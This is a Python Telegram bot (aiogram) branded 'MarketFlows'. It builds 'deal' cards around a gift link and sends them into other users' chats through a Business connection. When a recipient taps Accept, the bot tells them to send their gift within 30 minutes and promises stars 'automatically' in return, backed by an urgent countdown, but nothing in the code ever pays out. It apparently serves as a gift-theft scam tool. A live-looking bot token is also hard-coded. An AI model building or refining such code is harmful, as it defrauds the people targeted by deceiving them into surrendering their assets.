import asyncio  
import secrets  
import sqlite3  
import re
from datetime import datetime, timedelta  
  
from aiogram import Bot, Dispatcher, F, Router  
from aiogram.client.default import DefaultBotProperties  
from aiogram.enums import ParseMode  
from aiogram.filters import CommandStart  
from aiogram.fsm.storage.memory import MemoryStorage  
from aiogram.types import (  
    Message, CallbackQuery, BusinessConnection,  
    InlineKeyboardMarkup, InlineKeyboardButton,  
    ReplyKeyboardMarkup, KeyboardButton  
)  
  
BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
BRAND = "MarketFlows"  
DB_PATH = "marketflows.db"  

active_business_connection_id = None
active_business_chats = {} # chat_id -> name

def db_init():  
    conn = sqlite3.connect(DB_PATH)  
    c = conn.cursor()  
    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')""")
    c.execute("""CREATE TABLE IF NOT EXISTS deals (  
        id INTEGER PRIMARY KEY AUTOINCREMENT,  
        code TEXT UNIQUE,  
        creator_id INTEGER,  
        creator_username TEXT,  
        custom_text TEXT,  
        gift_link TEXT,  
        status TEXT DEFAULT 'pending',  
        expires_at TEXT,
        created_at TEXT  
    )""")  
    conn.commit()  
    conn.close()  

def set_db_status(code, status):  
    conn = sqlite3.connect(DB_PATH)  
    conn.execute("UPDATE deals SET status=? WHERE code=?", (status, code))  
    conn.commit()  
    conn.close()  

def get_deal(code):  
    conn = sqlite3.connect(DB_PATH)  
    row = conn.execute("SELECT * FROM deals WHERE code=?", (code,)).fetchone()  
    conn.close()  
    return row  

def main_menu():
    return ReplyKeyboardMarkup(  
        keyboard=[  
            [KeyboardButton(text="🤝 Создать сделку"), KeyboardButton(text="📂 Мои чаты")]
        ],  
        resize_keyboard=True  
    )  

router = Router()  

@router.business_connection()
async def business_connection_handler(bc: BusinessConnection):
    global active_business_connection_id
    if bc.is_enabled:
        active_business_connection_id = bc.id

@router.message(F.business_connection_id.is_not(None))
async def business_message_handler(msg: Message):
    global active_business_connection_id
    if msg.business_connection_id:
        active_business_connection_id = msg.business_connection_id
    if msg.chat and msg.chat.id != msg.from_user.id:
        name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or str(msg.chat.id))
        active_business_chats[msg.chat.id] = name

@router.message(CommandStart())  
async def cmd_start(msg: Message):  
    args = msg.text.split(maxsplit=1)  
    if len(args) > 1 and args[1].startswith("deal_"):  
        code = args[1].replace("deal_", "")  
        deal = get_deal(code)  
        if deal:  
            custom_text = deal[4]
            gift_link = deal[5]
            text_msg = f"{custom_text}\n\n{gift_link}"
            
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                    InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
                ]
            ])
            await msg.answer(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
            return  

    await msg.answer(f"🏦 <b>{BRAND}</b>\n\nПришли мне текст со ссылкой на подарок, и я оформлю карточку ордера.", parse_mode="HTML", reply_markup=main_menu())  

@router.message(F.text == "📂 Мои чаты")
async def chats_list(msg: Message):
    if active_business_chats:
        text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
    else:
        text = "ℹ️ Нет активных чатов. Напишите кому-нибудь с бизнес-аккаунта."
    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu())

@router.message(F.text == "🤝 Создать сделку")
async def create_deal_btn(msg: Message):
    await msg.answer("✍️ Пришли мне текст со ссылкой на подарок.", parse_mode="HTML")

@router.message(F.text)
async def handle_deal_creation_text(msg: Message):
    if msg.text.startswith("/") or msg.text in ["📂 Мои чаты", "🤝 Создать сделку"]:
        return

    full_text = msg.text.strip()
    words = full_text.split()
    gift_link = "https://t.me/nft/Gift"
    for w in words:
        if w.startswith("http://") or w.startswith("https://"):
            gift_link = w
            break

    code = secrets.token_hex(4).upper()
    expires_at = datetime.utcnow() + timedelta(minutes=30)
    
    conn = sqlite3.connect(DB_PATH)  
    conn.execute(  
        "INSERT INTO deals (code, creator_id, creator_username, custom_text, gift_link, status, expires_at, created_at) "  
        "VALUES (?,?,?,?,?,?,?,?)",  
        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), full_text, gift_link, 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
    )  
    conn.commit()  
    conn.close()

    buttons = [
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
        ]
    ]
    
    if active_business_chats:
        for cid, name in active_business_chats.items():
            buttons.insert(0, [InlineKeyboardButton(text=f"Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
    else:
        buttons.insert(0, [InlineKeyboardButton(text="Отправить: Тест (себе)", callback_data=f"sendtochat_{code}_{msg.chat.id}")])

    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    preview_text = f"{full_text}\n\n{gift_link}"

    await msg.answer(text=preview_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)

@router.callback_query(F.data.startswith("sendtochat_"))
async def send_to_chat(cb: CallbackQuery):
    parts = cb.data.split("_")
    code = parts[1]
    target_chat_id = int(parts[2])
    
    deal = get_deal(code)
    if not deal:
        await cb.answer("Ордер не найден", show_alert=True)
        return

    custom_text = deal[4]
    gift_link = deal[5]
    text_msg = f"{custom_text}\n\n{gift_link}"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
        ]
    ])

    target_name = active_business_chats.get(target_chat_id, "клиенту")

    try:
        if active_business_connection_id:
            await cb.bot.send_message(
                chat_id=target_chat_id,
                text=text_msg,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=False,
                business_connection_id=active_business_connection_id
            )
        else:
            await cb.bot.send_message(
                chat_id=target_chat_id,
                text=text_msg,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=False
            )
        
        await cb.message.edit_reply_markup(reply_markup=None)
        await cb.answer(f"Отправлено: {target_name}. Telegram подтвердил. Кнопки прикреплены.", show_alert=True)
    except Exception as e:
        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)

@router.callback_query(F.data.startswith("sel_accept_"))
async def sel_accept(cb: CallbackQuery):
    code = cb.data.split("_")[2]
    deal = get_deal(code)
    if not deal:
        await cb.answer("Ордер не найден", show_alert=True)
        return

    custom_text = deal[4]
    numbers = re.findall(r'\d+', custom_text.replace(" ", "")) if custom_text else []
    amount_str = numbers[0] if numbers else "3000"

    set_db_status(code, "accepted")
    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ автоматически пополнятся на ваш аккаунт.", show_alert=True)

    gift_link = deal[5]
    expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
    
    diff = expires_at - datetime.utcnow()
    total_secs = max(0, int(diff.total_seconds()))
    mins, secs = divmod(total_secs, 60)
    timer_str = f"{mins:02d}:{secs:02d}"

    text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
        ]
    ])

    try:
        if active_business_connection_id:
            await cb.bot.edit_message_text(
                chat_id=cb.message.chat.id,
                message_id=cb.message.message_id,
                text=text_msg,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=False,
                business_connection_id=active_business_connection_id
            )
        else:
            await cb.message.edit_text(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
        asyncio.create_task(run_animation_timer(cb.bot, cb.message.chat.id, cb.message.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id))
    except Exception:
        pass

async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str):
    while True:
        await asyncio.sleep(30)
        deal = get_deal(code)
        if not deal or deal[6] != 'accepted':
            break

        diff = expires_at - datetime.utcnow()
        total_secs = int(diff.total_seconds())
        if total_secs <= 0:
            break

        mins, secs = divmod(total_secs, 60)
        timer_str = f"{mins:02d}:{secs:02d}"

        text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
            ]
        ])

        try:
            if biz_id:
                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False, business_connection_id=biz_id)
            else:
                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
        except Exception:
            break

@router.callback_query(F.data.startswith("sel_reject_"))
async def sel_reject(cb: CallbackQuery):
    code = cb.data.split("_")[2]
    set_db_status(code, "rejected")
    try:
        if active_business_connection_id:
            await cb.bot.edit_message_text(chat_id=cb.message.chat.id, message_id=cb.message.message_id, text="❌ Ордер отклонён.", reply_markup=None, business_connection_id=active_business_connection_id)
        else:
            await cb.message.edit_text(text="❌ Ордер отклонён.", reply_markup=None)
    except Exception:
        pass
    await cb.answer()

async def main():  
    db_init()  
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
    await bot.delete_webhook(drop_pending_updates=True)  
    dp = Dispatcher(storage=MemoryStorage())  
    dp.include_router(router)  
    print(f"[{BRAND}] Бот успешно запущен.")  
    await dp.start_polling(bot)  

if __name__ == "__main__":  
    asyncio.run(main())
